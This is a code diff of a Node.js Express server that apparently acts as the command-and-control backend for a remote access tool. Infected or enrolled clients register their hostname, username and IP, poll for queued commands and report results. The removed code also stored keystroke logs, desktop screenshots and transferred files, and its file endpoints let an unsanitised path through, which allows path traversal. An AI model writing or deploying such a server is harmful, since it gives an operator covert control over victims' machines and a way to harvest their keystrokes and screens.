@@ -1,242 +1,159 @@
 
 const express = require('express');
-const http = require('http');
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const fs = require('fs-extra');
 const path = require('path');
+const http = require('http');
+
+// Initialize Express app
 const app = express();
 const server = http.createServer(app);
-const PORT = process.env.PORT || 3001;
 
-// Setup middleware
+// Set up middleware
 app.use(cors());
-app.use(bodyParser.json({ limit: '50mb' }));
-app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
 
-// Setup storage directories
-const STORAGE_DIR = path.join(__dirname, '../../storage');
-const SCREENSHOTS_DIR = path.join(STORAGE_DIR, 'screenshots');
-const FILES_DIR = path.join(STORAGE_DIR, 'files');
-const KEYLOG_DIR = path.join(STORAGE_DIR, 'keylogs');
+// In-memory storage for clients
+const clients = {};
+const clientCommands = {};
 
-// Ensure storage directories exist
-fs.ensureDirSync(SCREENSHOTS_DIR);
-fs.ensureDirSync(FILES_DIR);
-fs.ensureDirSync(KEYLOG_DIR);
+// Ensure data directory exists
+const dataDir = path.join(__dirname, '../../data');
+fs.ensureDirSync(dataDir);
+fs.ensureDirSync(path.join(dataDir, 'screenshots'));
+fs.ensureDirSync(path.join(dataDir, 'downloads'));
 
-// In-memory database for client tracking
-const clientsDb = {
-  clients: {},
-  commands: {},
-  addClient(clientData) {
-    this.clients[clientData.id] = {
-      ...clientData,
-      lastSeen: new Date(),
-      commands: [],
-    };
-    if (!this.commands[clientData.id]) {
-      this.commands[clientData.id] = [];
-    }
-    return this.clients[clientData.id];
-  },
-  updateClient(id, data) {
-    if (this.clients[id]) {
-      this.clients[id] = { ...this.clients[id], ...data, lastSeen: new Date() };
-      return this.clients[id];
-    }
-    return null;
-  },
-  getClient(id) {
-    return this.clients[id] || null;
-  },
-  getAllClients() {
-    return Object.values(this.clients);
-  },
-  addCommand(clientId, command) {
-    if (!this.commands[clientId]) {
-      this.commands[clientId] = [];
-    }
-    
-    const commandWithId = {
-      id: Date.now().toString(),
-      ...command,
-      timestamp: new Date(),
-      executed: false
-    };
-    
-    this.commands[clientId].push(commandWithId);
-    return commandWithId;
-  },
-  getCommands(clientId) {
-    return this.commands[clientId]?.filter(cmd => !cmd.executed) || [];
-  },
-  markCommandExecuted(clientId, commandId) {
-    if (this.commands[clientId]) {
-      const cmdIndex = this.commands[clientId].findIndex(c => c.id === commandId);
-      if (cmdIndex >= 0) {
-        this.commands[clientId][cmdIndex].executed = true;
-        return true;
-      }
-    }
-    return false;
-  }
-};
+// API Routes
+const apiRouter = express.Router();
 
-// API routes for client registration and management
-app.post('/api/clients/register', (req, res) => {
-  const clientData = req.body;
-  const client = clientsDb.addClient(clientData);
-  console.log(`Client registered: ${client.hostname} (${client.id})`);
-  res.json({ success: true });
+// Get all registered clients
+apiRouter.get('/clients', (req, res) => {
+  const clientList = Object.values(clients);
+  res.json(clientList);
 });
 
-app.get('/api/clients/:id/commands', (req, res) => {
-  const { id } = req.params;
-  const commands = clientsDb.getCommands(id);
-  res.json(commands);
-});
-
-app.post('/api/clients/:id/command-results', (req, res) => {
-  const { id } = req.params;
-  const { command, output, error } = req.body;
+// Register or update a client
+apiRouter.post('/clients/register', (req, res) => {
+  const { id, hostname, username, os, ip } = req.body;
   
-  console.log(`Command result from ${id}:`);
-  console.log(`Command: ${command}`);
-  console.log(`Output: ${output}`);
-  
-  if (error) {
-    console.log(`Error: ${error}`);
+  if (!id || !hostname) {
+    return res.status(400).json({ error: 'Missing required fields' });
   }
   
-  res.json({ success: true });
-});
-
-app.post('/api/clients/:id/commands/:commandId/ack', (req, res) => {
-  const { id, commandId } = req.params;
-  const success = clientsDb.markCommandExecuted(id, commandId);
-  res.json({ success });
-});
-
-app.put('/api/clients/:id/status', (req, res) => {
-  const { id } = req.params;
-  const clientData = req.body;
-  const client = clientsDb.updateClient(id, clientData);
-  res.json({ success: !!client });
-});
-
-app.post('/api/clients/:id/desktop-stream', (req, res) => {
-  const { id } = req.params;
-  const timestamp = Date.now();
-  const screenshotPath = path.join(SCREENSHOTS_DIR, `${id}_${timestamp}.jpg`);
+  // Create or update client
+  clients[id] = {
+    id,
+    hostname,
+    username,
+    os,
+    ip: ip || req.ip,
+    status: 'online',
+    lastSeen: new Date().toISOString(),
+    categoryId: clients[id]?.categoryId || ""
+  };
   
-  // Save the screenshot to the screenshots directory
-  const fileStream = fs.createWriteStream(screenshotPath);
-  req.pipe(fileStream);
-  
-  fileStream.on('finish', () => {
-    // Update the client with the latest screenshot path
-    clientsDb.updateClient(id, {
-      lastScreenshot: `/screenshots/${id}_${timestamp}.jpg`
-    });
-    res.json({ success: true });
-  });
-  
-  fileStream.on('error', (err) => {
-    console.error('Error saving screenshot:', err);
-    res.status(500).json({ success: false, error: 'Failed to save screenshot' });
-  });
-});
-
-app.post('/api/clients/:id/keylog', (req, res) => {
-  const { id } = req.params;
-  const { data } = req.body;
-  const timestamp = Date.now();
-  const keylogPath = path.join(KEYLOG_DIR, `${id}_${timestamp}.txt`);
-  
-  fs.appendFile(keylogPath, data + '\n', (err) => {
-    if (err) {
-      console.error('Error saving keylog data:', err);
-      return res.status(500).json({ success: false });
-    }
-    res.json({ success: true });
-  });
-});
-
-app.post('/api/clients/:id/file-transfers', (req, res) => {
-  const { id } = req.params;
-  const { path, status } = req.body;
-  console.log(`File transfer from ${id}: ${path} - ${status}`);
-  res.json({ success: true });
-});
-
-app.get('/api/files', (req, res) => {
-  const { path: filePath } = req.query;
-  const fullPath = path.join(FILES_DIR, filePath);
-  
-  if (!fs.existsSync(fullPath)) {
-    return res.status(404).json({ success: false, error: 'File not found' });
+  // Initialize command queue if it doesn't exist
+  if (!clientCommands[id]) {
+    clientCommands[id] = [];
   }
   
-  res.sendFile(fullPath);
+  res.json({ success: true, client: clients[id] });
 });
 
-app.post('/api/files', (req, res) => {
-  const { path: filePath } = req.query;
-  const fullPath = path.join(FILES_DIR, filePath);
-  const dirPath = path.dirname(fullPath);
+// Update client status
+apiRouter.post('/clients/:id/heartbeat', (req, res) => {
+  const { id } = req.params;
   
-  // Ensure directory exists
-  fs.ensureDirSync(dirPath);
-  
-  // Save the file
-  const fileStream = fs.createWriteStream(fullPath);
-  req.pipe(fileStream);
-  
-  fileStream.on('finish', () => {
+  if (clients[id]) {
+    clients[id].lastSeen = new Date().toISOString();
+    clients[id].status = 'online';
     res.json({ success: true });
-  });
+  } else {
+    res.status(404).json({ error: 'Client not found' });
+  }
+});
+
+// Get pending commands for a client
+apiRouter.get('/clients/:id/commands', (req, res) => {
+  const { id } = req.params;
   
-  fileStream.on('error', (err) => {
-    console.error('Error saving file:', err);
-    res.status(500).json({ success: false, error: 'Failed to save file' });
-  });
+  if (!clientCommands[id]) {
+    clientCommands[id] = [];
+  }
+  
+  const commands = clientCommands[id];
+  clientCommands[id] = []; // Clear commands after retrieving
+  
+  res.json({ commands });
 });
 
-// API routes for the frontend
-app.get('/api/clients', (req, res) => {
-  const clients = clientsDb.getAllClients();
-  res.json(clients);
-});
-
-app.post('/api/clients/:id/commands', (req, res) => {
+// Send command to client
+apiRouter.post('/clients/:id/commands', (req, res) => {
   const { id } = req.params;
   const { type, payload } = req.body;
   
-  // Check if client exists
-  if (!clientsDb.getClient(id)) {
-    return res.status(404).json({ success: false, error: 'Client not found' });
+  if (!type) {
+    return res.status(400).json({ error: 'Command type is required' });
   }
   
-  // Add command for the client
-  const command = clientsDb.addCommand(id, { type, payload });
+  if (!clientCommands[id]) {
+    clientCommands[id] = [];
+  }
+  
+  const command = {
+    id: Date.now().toString(),
+    type,
+    payload: payload || '',
+    timestamp: new Date().toISOString()
+  };
+  
+  clientCommands[id].push(command);
+  
   res.json({ success: true, command });
 });
 
-// Serve static screenshot files
-app.use('/screenshots', express.static(SCREENSHOTS_DIR));
+// Handle screenshot upload
+apiRouter.post('/clients/:id/screenshot', (req, res) => {
+  // This would handle file uploads in a real implementation
+  // For this example, we're just acknowledging the request
+  const { id } = req.params;
+  
+  if (clients[id]) {
+    clients[id].lastScreenshot = `/screenshots/${id}_${Date.now()}.jpg`;
+    res.json({ success: true, screenshotPath: clients[id].lastScreenshot });
+  } else {
+    res.status(404).json({ error: 'Client not found' });
+  }
+});
 
-// Serve the React app in production
+// Mount API router
+app.use('/api', apiRouter);
+
+// Serve static files from the React app in production
 if (process.env.NODE_ENV === 'production') {
   app.use(express.static(path.join(__dirname, '../../dist')));
+  
   app.get('*', (req, res) => {
-    res.sendFile(path.join(__dirname, '../../dist/index.html'));
+    res.sendFile(path.join(__dirname, '../../dist', 'index.html'));
   });
 }
 
 // Start the server
+const PORT = process.env.PORT || 3001;
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
 
-module.exports = { app, server };
+// Clean up offline clients periodically
+setInterval(() => {
+  const now = Date.now();
+  Object.keys(clients).forEach(id => {
+    const lastSeen = new Date(clients[id].lastSeen).getTime();
+    if (now - lastSeen > 60000) { // 1 minute timeout
+      clients[id].status = 'offline';
+    }
+  });
+}, 30000);
+
+module.exports = server;
